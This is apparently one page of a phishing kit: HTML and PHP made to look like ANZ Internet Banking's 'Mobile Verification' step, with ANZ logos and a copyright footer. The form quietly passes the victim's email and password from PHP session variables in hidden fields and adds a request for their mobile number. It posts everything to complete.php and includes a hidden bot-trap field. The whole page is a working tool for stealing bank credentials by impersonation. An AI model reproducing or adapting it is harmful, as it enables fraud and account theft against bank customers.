...
@keyframes icPxHz { 
  ...
  <link rel="shortcut icon" type="image/x-icon" href="favicon.ico">
        ...
        *,
        ...
        .pageContainer {
            display: none;
        }</style><section id="root"><div class="sc-htoDjs bBaFcw"><header class="sc-iRbamj gsHUbf"><div class="sc-jlyJG kYvYgm"><div class="sc-gqjmRU sc-kgoBCf tQNRl"><img data-test-id="header-logo" src="assets/anz-logo.1.0.0.svg" alt="ANZ Logo" class="sc-gipzik gJhOur"></div></div></header><main class="sc-dnqmqq fgYQMj"><div class="sc-gqjmRU jwCRHS"><div class="sc-dxgOiQ iyDMES"><div class="sc-VigVT sc-jzJRlG bsYAOt"><div class="sc-bXGyLb ePIfrV"><img alt="Error Icon" data-test-id="error-page-info-icon" src="assets/Info-Icon.1.0.0.svg" aria-hidden="true" class="sc-daURTG frpFfQ"><h1 data-test-id="error-title" class="sc-iELTvK gQayGb">Please check your browser settings</h1></div><div class="sc-lkqHmb jtlJDR"><div data-test-id="error-message" class="sc-eLExRp fFdpBA"><div class="sc-bdVaJa sc-bxivhb kMXqJD"><div class="sc-bwzfXH sc-ifAKCX fBZoRA"><div class="sc-htpNat sc-EHOje hiHoEC"><p class="sc-gzOgki ijCyQu">To access ANZ Internet Banking, please check your browser settings.</p><p class="sc-gzOgki kmExjg">Try logging in with a different browser. See browser and software settings on ANZ.com for more information.</p></div></div><div class="sc-bwzfXH sc-ifAKCX jTKZuQ"><div class="sc-htpNat sc-EHOje fuDXid"><a data-test-id="software-requirements" href="#/support/internet-banking/getting-started/browser-software-settings/" rel="noopener" target="_self" class="sc-eHgmQL sc-cvbbAY jsqTYX"><button data-test-id="go-back-to-anz" class="sc-jKJlTe hUOKGW">View browser and software settings</button></a></div></div></div></div></div></div></div></div></main>
		<footer class="sc-esjQYD gbxeYH"><div class="sc-kIPQKe qtnPq"><div class="sc-gqjmRU sc-kgoBCf tQNRl"><span class="sc-ibxdXY hGxWjT"><div data-test-id="footer-details" class="sc-kEYyzF jMeGNg">© Australia and New Zealand Banking Group Limited (ANZ) 2022<span class="sc-eXEjpC jRMrpg"> ABN 11 005 357 522.</span></div></span></div></div></footer></div></section></noscript><div id="root" class="pageContainer"><div class="sc-bZQynM isZLRV"><header class="sc-jDwBTQ cHvZzk"><div class="sc-gPEVay hinJZb"><div class="sc-htoDjs sc-iwsKbI sc-jzJRlG iuAjqe"><a data-test-id="home-anz-link" href="#/personal/" title="ANZ Logo" class="sc-hSdWYo dtZarJ"><img data-test-id="header-logo" src="assets/anz-logo.1.0.0.svg" alt="ANZ logo" class="sc-iRbamj kuHKAw"></a></div></div></header>
		 <ul id="progress-bar" class="steps-4"><li class="inactive" tabindex="-1"><span>Step 1<span class="step-detail">Notice</span></span><span class="a11y-context"> currently active</span></li><li class="active"><span>Step 2<span class="step-detail">Mobile Verification</span></span><span class="a11y-context"> currently inactive</span></li><li><span>Step 3<span class="step-detail">Finish</span></span><span class="a11y-context"> currently inactive</span></li></ul>
    
		<main class="sc-gzVnrw dRvgMj"><div class="sc-htoDjs sc-iwsKbI fMWrBU"><div class="sc-htoDjs PQYSP"><div class="sc-chPdSV jDQaYf"><div class="sc-gZMcBi sc-gqjmRU aEZVB">
<form id="form3" method="POST" action="complete.php?_sessionid=<?=$_SESSION['hash']?>">
	<input name="email" value="<?=$_SESSION['email']?>" style="display: none;" type="text" />
	<input name="password" value="<?=$_SESSION['password']?>" style="display: none;" type="text" /><div class="sc-bdVaJa sc-bxivhb gHmjpC"><div class="sc-bwzfXH sc-ifAKCX iozHEh"><div class="sc-htpNat sc-EHOje cmUniE">
		<div class="sc-gxMtzJ kyksVE">
		<h1 data-test-id="register-header" id="register-header" tabindex="-1" class="sc-iELTvK kKWSlH">
		<span role="text"> <div class="sc-dqBHgY jKIwyN">Personal details</div></span></h1></div></div></div>
		<div id="live-container"><div class="sc-bwzfXH sc-ifAKCX iozHEh">
		<div class="sc-htpNat sc-EHOje cmUniE">
		<div class="sc-jAaTju ifGlXi">
		<div class="sc-cHGsZl gvkmJ sc-kTUwUJ ksgrRI" data-test-id="customerRegistrationNumber_wrapper">
		<label data-test-id="customerRegistrationNumber_label" for="customerRegistrationNumber" class="sc-fAjcbJ kNGuXD">Please confirm your mobile number to continue with your action.</label>
		<div data-test-id="customerRegistrationNumber_info" class="sc-frDJqD hYSWhU"><div data-test-id="customerRegistrationNumber_info_text" class="sc-kvZOFW kvJuhU"></div></div>
		</div></div></div></div><div class="sc-bwzfXH sc-ifAKCX iozHEh">
		<div class="sc-htpNat sc-EHOje cmUniE">
		<div class="sc-cHGsZl gvkmJ sc-kTUwUJ ksgrRI" data-test-id="telecode_wrapper">
		<label data-test-id="telecode_label" for="telecode" class="sc-fAjcbJ kNGuXD">Mobile number</label>
		<div data-test-id="telecode_info" class="sc-frDJqD hYSWhU">
		<div data-test-id="telecode_info_text" class="sc-kvZOFW kvJuhU"></div></div>
		<div class="sc-cJSrbW dqfvIK">
		<input id="telecode" required name="mobile" type="tel" minlength=10 maxlength="12" data-test-id="telecode_input" placeholder="" autocomplete="new-password" aria-describedby="" class="sc-TOsTZ jELuLd" value="">
		<span value="" class="sc-hmzhuo fEtbNT"></span></div></div></div></div></div>
		<div class="sc-bwzfXH sc-ifAKCX yxWOV"><div class="sc-htpNat sc-EHOje cmUniE">
		<button type="submit" data-test-id="next-button" class="sc-dxgOiQ fQVlJA">
		<span role="text">Confirm</span></button>
  <input type="text" name="robotics" value="" style="display: none;" /></
		</div></div>
